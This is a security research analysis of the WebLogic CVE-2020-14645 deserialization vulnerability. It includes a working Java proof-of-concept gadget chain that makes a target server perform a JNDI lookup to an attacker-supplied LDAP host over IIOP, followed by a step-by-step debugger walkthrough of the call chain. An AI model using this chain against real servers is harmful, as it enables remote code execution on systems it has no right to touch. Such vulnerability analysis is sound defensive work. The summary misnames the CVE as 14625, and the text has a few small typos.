# Analysis of Weblogic Remote Command Execution Vulnerability (CVE-2020-14645)

> Author: White Hat Alliance Security Research Institute @hu4wufu
>
> Verified by: White Hat Alliance Security Research Institute @r4v3zn



## 0x00 Preface

The recently disclosed deserialization RCE vulnerability CVE-2020-14645 in Weblogic is a bypass of CVE-2020-2883 patch. CVE-2020-2883 essentially called arbitrary methods through ReflectionExtractor, which then executed arbitrary commands using the exec method of the Runtime object. The patch blacklisted ReflectionExtractor, so a new exploit chain could be constructed using UniversalExtractor. UniversalExtractor can call the get and is methods arbitrarily, which leads to the exploitation of JDNI remote dynamic class loading. UniversalExtractor is unique to Weblogic version 12.2.1.4.0, and this article analyzes it based on that version.



## 0x01 Vulnerability Reproduction

The POC for exploiting the vulnerability is as follows. The analysis below is based on this POC:

```java
ChainedExtractor chainedExtractor = new ChainedExtractor(new ValueExtractor[]{new ReflectionExtractor("toString",new Object[]{})});
PriorityQueue<Object> queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor));
queue.add("1");
queue.add("1");
// Construct UniversalExtractor to call any method of JdbcRowSetImpl object
UniversalExtractor universalExtractor = new UniversalExtractor();
Object[] object = new Object[]{};
Reflections.setFieldValue(universalExtractor, "m_aoParam", object);
Reflections.setFieldValue(universalExtractor, "m_sName", "DatabaseMetaData");
Reflections.setFieldValue(universalExtractor, "m_fMethod", false);
ValueExtractor[] valueExtractorList = new ValueExtractor[]{universalExtractor};
Field[] fields = ChainedExtractor.class.getDeclaredFields();
Field field = ChainedExtractor.class.getSuperclass().getDeclaredField("m_aExtractor");
field.setAccessible(true);
field.set(chainedExtractor, valueExtractorList);
JdbcRowSetImpl jdbcRowSet = Reflections.createWithoutConstructor(JdbcRowSetImpl.class);
jdbcRowSet.setDataSourceName("ldap://ip:port/uaa");
Object[] queueArray = (Object[])((Object[]) Reflections.getFieldValue(queue, "queue"));
queueArray[0] = jdbcRowSet;
// Send IIOP protocol data packet
Context context = getContext("iiop://ip:port");
context.rebind("hello", queue);
```

Successfully popped the computer

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682415758370-f75b02fe-344f-4559-9714-237bddccd182.png)



## 0x02 Vulnerability Analysis

Those familiar with JDNI injection know that the vulnerability is triggered in the lookup() method. In this case, we set a breakpoint at line 326 of the lookup() method in JdbcRowSetImpl.class.

The following is a brief call chain for exploiting the vulnerability:

We start from the beginning and know that the essence of deserialization is to restore objects according to certain rules when we read data from the IO stream. We set a breakpoint at in.readObject() and investigate the PriorityQueue.readObject() method.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682415821026-3da34ef1-87fc-479e-bb41-2434f7c3a484.png)

Here, line 782 executes s.defaultReadObject(), line 785 executes s.readInt() to assign the object input stream size and array length, and line 790 executes a for loop to assign the s.readObject() method to the queue object array one by one. Here, the length of the queue object array is 2.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682415957621-409a311b-a101-4090-b6c9-54c784f60811.png)

Then, we continue to investigate the heapify() method. PriorityQueue is actually a min-heap, and sorting and heapifying are achieved through the siftDown() method.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682415986883-35de3200-6994-4d1d-8682-89e408b816fe.png)

When we investigate the siftDown() method, it first checks whether the comparator is null. We can see how the comparator is assigned. It is assigned in the constructor of PriorityQueue, and besides assigning this.comparator, it also initializes the length through initialCapacity.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416031870-19799fef-41c8-4d95-8270-66887e64dff1.png)



Since the comparator is not null, we execute the siftDownUsingComparator() method, so we continue to investigate the siftDownUsingComparator() method.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416174041-59523f9f-5924-4bad-a016-271fa361215a.png)

We then continue to investigate the ExtractorComparator.compare() method.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416182420-5fb0315b-a4f3-433d-9a08-032c991d79f0.png)

Here, the method this.m_extractor.extract() is called. Let's take a look at this.m_extractor. It is related to the extractor that was passed in. Here, we need to construct this.m_extractor as ChainedExtractor in order to call the extract() method of ChainedExtractor.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416208256-6519a0dd-6767-4421-bb2e-e3aba9225eb1.png)

Continuing to investigate the ChainedExtractor.extract() method, we can see that it traverses the aExtractor array and calls the extract() method.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416221034-a1d7102d-a2b1-4d17-a1ca-4c90ad3768e5.png)

Continuing to investigate the extract() method, because m_cacheTarget is marked as transient, it cannot be deserialized, so only the else part can be executed, and the vulnerability point is ultimately triggered through this.extractComplex(oTarget).

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416234128-15c8dd92-e6db-47b9-b9bb-d21a6a0c5073.png)

In this.extractComplex(oTarget), we can see that the reflection is executed through method.invoke(), where oTarget and aoParam are both controllable.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416266141-1d4ba18c-2d7a-4199-98ad-af91729c21fa.png)

We continue to investigate the findMethod() method at line 190. At line 475, fExactMatch needs to be true and fStatic needs to be false in order to allow the passed-in clz to access any method. fStatic is controllable, and fExactMatch defaults to true, which can be kept unchanged as long as it does not enter the for loop, making cParams an empty Class array or aclzParam an empty Class array. Here, aclzParam is obtained from the getClassArray() method.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416415425-27600d94-5f46-4c58-bffb-9f9c57f166cf.png)

In getClasssArray, the corresponding Class is obtained by obtaining the value of the input parameter.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416427543-111c0777-9237-4417-82e9-301c0f0d3ba9.png)

Since the passed-in aoParam is an empty object[], the corresponding Class is also an empty Class[], and when isPropertyExtractor() is called, we can see that the opposite value of this._fMethod is obtained.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416439293-189b1d63-1f9e-4a56-a4ae-96836e411432.png)

Since m_fMethod is marked as transient and not serialized, by analyzing the assignment process of m_fMethod, it can be found that sCName is obtained during init() and assigned by judging whether it ends with ().

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416450876-2776b3f5-1567-48ae-8c3f-bebb758a2925.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416458699-c94cf671-d802-4ed0-b022-b3dbf98aa93e.png)

Due to the parameter being this, the getValueExtractorCanonicalName() method always returns null.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416492455-821f582a-d5f2-4813-a8fe-280bd7944089.png)

Continuing to investigate the getValueExtractorCanonicalName() function, it ultimately calls computeValuExtractorCanonicalName for processing.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416508674-e6231edf-117f-4337-96ef-6142ad6b9cb0.png)

After continuing to investigate computeValuExtractorCanonicalName(), it will return null if aoParam is not null and the array length is greater than 0. Because aoParam must be null, the method we call must have no parameters. Then, if the method name sName does not end with (), it will simply return the method name. Otherwise, it will determine whether the method name starts with a prefix in the VALUE_EXTRACTOR_BEAN_ACCESSOR_PREFIXES array. If so, it will be truncated and returned.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416528671-42e3d90c-59bc-407b-a8af-22eb5904fb71.png)

Back to the extractComplex() method, in the if condition, the method name returned above will be capitalized and concatenated with a prefix in the BEAN_ACCESSOR_PREFIXES array to determine whether the spliced method exists in the clzTarget class. Here, we can see that we can only call parameterless methods that start with get or is in any class. This explains why the poc uses JNDI to achieve remote dynamic class loading.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416541300-b45db286-ade1-4e54-b781-ddb1c9b4a50b.png)

Continuing to investigate the method.invoke() method will directly jump to JdbcRowSetImpl.getDataba seme taData().

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416628384-fd4f128d-a2c7-4acf-bda1-f7156440b1e5.png)

Since JdbcRowSetImpl.getDataba seme taData() calls this.connect(), we can see that the lookup operation is executed at line 326, triggering the vulnerability.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416645367-84d38989-f394-40ff-987c-5e6bae8a437f.png)

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416679859-0dc74278-2413-4d7e-be66-891e4d4e977b.png)

By continuing to investigate getDataSourceName(), we can see that the controllable dataSource is called.

![img](https://cdn.nlark.com/yuque/0/2023/png/32457783/1682416694211-5fb787b1-926b-4eca-bb5a-89e4e196983a.png)



## 0x03 Summary

In summary, this vulnerability mainly exploits UniversalExtractor to bypass the blacklist and call get and is methods arbitrarily, leading to JNDI injection and extending CVE-2020-14625.



## 0x04 References

- [WebLogic coherence UniversalExtractor deserialization vulnerability (CVE-2020-14645) analysis](https://paper.seebug.org/1280/#cve-2020-14645)
- https://www.oracle.com/security-alerts/cpujul2020.html
